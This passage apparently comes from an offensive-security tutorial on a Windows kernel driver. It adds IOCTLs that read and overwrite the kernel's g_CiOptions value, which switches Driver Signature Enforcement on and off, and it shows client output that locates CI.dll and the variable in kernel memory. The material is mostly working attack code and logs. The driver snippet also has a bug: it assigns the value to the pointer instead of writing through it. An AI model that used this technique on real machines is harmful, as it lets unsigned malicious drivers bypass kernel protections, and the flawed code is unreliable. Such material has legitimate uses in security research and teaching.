If you want to implement the ability to read, enable and disable DSE from your driver, add the new IOCTLs and a struct to carry the memory location from the client.

```
#define RED_OCTOBER_ENUM_DSE					CTL_CODE(RED_OCTOBER_DEVICE, 0x820, METHOD_NEITHER, FILE_ANY_ACCESS)
#define RED_OCTOBER_DISABLE_DSE					CTL_CODE(RED_OCTOBER_DEVICE, 0x821, METHOD_NEITHER, FILE_ANY_ACCESS)
#define RED_OCTOBER_ENABLE_DSE					CTL_CODE(RED_OCTOBER_DEVICE, 0x822, METHOD_NEITHER, FILE_ANY_ACCESS)
struct DSE
{
    ULONG64 Address;
};
```



To enumerate the current value, simply read the ULONG from the provided address.

```
ULONG* userBuffer = (ULONG*)Irp->UserBuffer;
userBuffer = *(PULONG)(dse->Address);
C:\RedOctober>Client.exe -ci
[+] Opening handle to driver...success!
[+] \SystemRoot\system32\CI.dll found @ 0xFFFFF8051D8F4000
[+] Userland CI.dll @ 0x00007FFBBE300000
[+] Userland CI!CiInitialize @ 0x00007FFBBE340130
[+] CI!CiInitialize offset is 0x40130
[+] Kernel CI!CiInitialize @ 0xFFFFF8051D934130
[+] g_CiOptions @ 0xFFFFF8051D92AD18
[+] Calling RED_OCTOBER_ENUM_DSE...success!

DSE Setting: 0x000E
```



To enable or disable DSE, write **6** or **E** respectively.

```
C:\RedOctober>Client.exe -ciE
[+] Opening handle to driver...success!
[+] \SystemRoot\system32\CI.dll found @ 0xFFFFF8051D8F4000
[+] Userland CI.dll @ 0x00007FFBC7770000
[+] Userland CI!CiInitialize @ 0x00007FFBC77B0130
[+] CI!CiInitialize offset is 0x40130
[+] Kernel CI!CiInitialize @ 0xFFFFF8051D934130
[+] g_CiOptions @ 0xFFFFF8051D92AD18
[+] Calling RED_OCTOBER_ENABLE_DSE...success!

C:\RedOctober>Client.exe -ci
[+] Opening handle to driver...success!
[+] \SystemRoot\system32\CI.dll found @ 0xFFFFF8051D8F4000
[+] Userland CI.dll @ 0x00007FFBC7770000
[+] Userland CI!CiInitialize @ 0x00007FFBC77B0130
[+] CI!CiInitialize offset is 0x40130
[+] Kernel CI!CiInitialize @ 0xFFFFF8051D934130
[+] g_CiOptions @ 0xFFFFF8051D92AD18
[+] Calling RED_OCTOBER_ENUM_DSE...success!

DSE Setting: 0x0006
```



Even though the DSE bit is now set to "enabled", we're still in test signing mode, so the check is never performed.